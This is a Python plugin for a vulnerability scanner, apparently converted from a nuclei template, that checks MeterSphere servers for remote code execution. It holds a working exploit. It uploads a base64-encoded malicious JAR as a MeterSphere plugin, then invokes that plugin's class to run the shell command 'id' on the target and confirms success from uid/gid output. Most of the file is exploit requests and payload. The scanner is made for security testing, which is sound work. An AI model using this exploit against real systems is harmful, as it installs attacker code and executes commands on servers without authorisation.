#!/usr/bin/env python3
# _*_ coding:utf-8 _*_
# 自动生成 by tools/convert_nuclei.py — 勿手改
# source_repo : nuclei-templates
# template    : http/vulnerabilities/metersphere/metersphere-plugin-rce.yaml  (MIT License)
# cve         : metersphere-plugin-rce
# risk_class  : risky  (read_only=可入可用集; risky/excluded=仅清单标记, 默认不加载)
# description : MeterSphere is susceptible to remote code execution. 

import pathlib
import re
import sys
from typing import Any, Tuple

try:
    from utils import PLUGIN_TYPE, plugin, urlutil
except Exception:
    sys.path.append(pathlib.Path(__file__).parent.parent.parent.__str__())
    from utils import PLUGIN_TYPE, plugin, urlutil

REQS = [{'req_idx': 0, 'method': 'POST', 'path': '/plugin/add', 'headers': {'Host': '{{Hostname}}', 'Accept': 'application/json, text/plain, */*', 'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryreButJNjkCniQExX'}, 'body': '------WebKitFormBoundaryreButJNjkCniQExX\nContent-Disposition: form-data; name="file"; filename="metersphere-plugin-DebugSampler-1.0.1-jar-with-all-dependencies.jar"\nContent-Type: application/octet-stream\n\n{{base64_decode("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")}}\n------WebKitFormBoundaryreButJNjkCniQExX\nContent-Disposition: form-data; name="request"; filename="blob"\nContent-Type: application/json\n\nnull\n------WebKitFormBoundaryreButJNjkCniQExX--', 'redirects': False, 'from_raw': True, 'matchers_condition': 'and'}, {'req_idx': 1, 'method': 'POST', 'path': '/plugin/customMethod', 'headers': {'Host': '{{Hostname}}', 'Origin': '{{BaseURL}}', 'Content-Type': 'application/json'}, 'body': '{"entry":"io.metersphere.plugin.DebugSampler.UiScriptApiImpl","request":"id"}', 'redirects': False, 'from_raw': True, 'matchers_condition': 'and'}]
MATCHERS = [{'type': 'word', 'part': 'body', 'condition': 'and', 'negative': False, 'case_insensitive': False, 'internal': False, 'words': ['"data":', '"success":true'], 'req_idx': 0}, {'type': 'regex', 'part': 'body', 'condition': 'or', 'negative': False, 'case_insensitive': False, 'internal': False, 'regex': ['((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)'], 'req_idx': 0}, {'type': 'status', 'part': 'body', 'condition': 'or', 'negative': False, 'case_insensitive': False, 'internal': False, 'status': [200], 'req_idx': 0}, {'type': 'word', 'part': 'body', 'condition': 'and', 'negative': False, 'case_insensitive': False, 'internal': False, 'words': ['"data":', '"success":true'], 'req_idx': 1}, {'type': 'regex', 'part': 'body', 'condition': 'or', 'negative': False, 'case_insensitive': False, 'internal': False, 'regex': ['((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)'], 'req_idx': 1}, {'type': 'status', 'part': 'body', 'condition': 'or', 'negative': False, 'case_insensitive': False, 'internal': False, 'status': [200], 'req_idx': 1}]
# L2 产品门控元数据（UPGRADE_PLAN §4.11）：模板 tags/metadata 提取的产品关键词, 无则 None
FINGERPRINT = ['metersphere']


class Plugin(plugin.PluginBase):
    def set_info(self):
        info = plugin.Info(
            name='MeterSphere - Remote Code Execution',
            catalog='metersphere-plugin-rce',
            itype=PLUGIN_TYPE.POC,
            protocol='http',
            port=80,
            ssl_protocol='https',
            ssl_port=443,
            requires=['http', 'https'],
        )
        # Info 基类暂无 fingerprint 字段（不改 utils/）, 直接挂属性供 L2 门控读取
        info.fingerprint = FINGERPRINT
        return info

    def _sub(self, text, url):
        if not text:
            return text
        origin = url.get_origin()
        root = '{}://{}'.format(url.protocol or 'http', url.netloc or url.host or '')
        host = url.netloc or '{}:{}'.format(url.host, url.port or self.info.port)
        return (text.replace('{{BaseURL}}', origin)
                    .replace('{{RootURL}}', root)
                    .replace('{{Hostname}}', url.host or '')
                    .replace('{{Host}}', host)
                    .replace('{{Port}}', str(url.port or self.info.port))
                    .replace('{{Scheme}}', url.protocol or 'http'))

    def _parts(self, response):
        headers_all = []
        for k, v in response.headers.items():
            headers_all.append('{}: {}'.format(k, v))
            headers_all.append('{}: {}'.format(k.lower(), v))
        headers_str = '\n'.join(headers_all)
        body = response.text or ''
        return {
            'body': body,
            'header': headers_str,
            'all': body + '\n' + headers_str,
            'response': body + '\n' + headers_str,
            'raw_response': body + '\n' + headers_str,
            'content_type': str(response.headers.get('Content-Type', '')),
            'location': str(response.headers.get('Location', '')),
        }

    def _msg_hit(self, text, content, mc, ci):
        if ci:
            text = text.lower()
            content = [x.lower() for x in content]
        if mc == 'and':
            return all(x in text for x in content)
        return any(x in text for x in content)

    def _match_one(self, response, m):
        ok = False
        if m['type'] == 'status':
            ok = response.status_code in m['status']
        else:
            text = self._parts(response).get(m['part'], '')
            if m['type'] == 'word':
                ok = self._msg_hit(text, m['words'], m['condition'], m['case_insensitive'])
            elif m['type'] == 'regex':
                # 缺陷2修复: regex 分支按 m['condition'] 聚合 (and=全部正则命中, or=任一中即可)
                # 之前只循环任一命中即 ok=True, 把 condition:and 实现成了 OR —— 误报根源。
                rx_hits = []
                for rx in m['regex']:
                    try:
                        if m['case_insensitive']:
                            rx_hits.append(re.search(rx, text, re.S | re.I) is not None)
                        else:
                            rx_hits.append(re.search(rx, text, re.S) is not None)
                    except re.error:
                        rx_hits.append(False)
                ok = all(rx_hits) if m.get('condition', 'or') == 'and' else any(rx_hits)
        if m['negative']:
            ok = not ok
        return ok

    def run(self, url: urlutil.Url, *args, **kwargs) -> Tuple[bool, Any]:
        if not url.protocol:
            url.protocol, url.port = self.https_or_http(url)
        if not url.protocol:
            return False, 'the network protocol does not match.'
        http = self.make_http_client()
        for req in REQS:
            target = self._sub(req['path'], url)
            if not target.startswith('http'):
                target = url.get_origin() + ('/' + target.lstrip('/') if target else '/')
            headers = None
            if req.get('headers'):
                headers = {k: self._sub(str(v), url) for k, v in req['headers'].items()}
            body = self._sub(req.get('body'), url) if req.get('body') else None
            err, resp = http.rq(target, method=req['method'], data=body, headers=headers,
                                allow_redirects=req.get('redirects', True))
            if err:
                # 请求异常上抛, 不折成 SAFE: 引擎 do_testing 捕获后记 WARN (四态契约)
                raise err
            mats = [m for m in MATCHERS if m.get('req_idx') == req.get('req_idx')]
            if not mats:
                return False, 'no matchers for request'
            results = [self._match_one(resp, m) for m in mats]
            hit = all(results) if req.get('matchers_condition', 'or') == 'and' else any(results)
            if hit:
                # 缺陷1修复: 只有「含非 internal matcher 的请求块命中」才产生最终结果。
                # nuclei 语义: 无 flow 多请求块 = 逐块独立执行/匹配 (OR 聚合);
                # internal=true matcher 命中只抑制打印, 不产生可见结果, 也不阻塞后续请求。
                # 因此: 全 internal 块命中 -> 继续发后续请求; 非 internal 块命中 -> 报。
                if any(not m.get('internal', False) for m in mats):
                    return True, 'matched {} on {} status={}'.format(req['method'], target, resp.status_code)
        return False, 'no match'


if __name__ == '__main__':
    plg = Plugin()
    print(plg.info.name, plg.info.catalog)
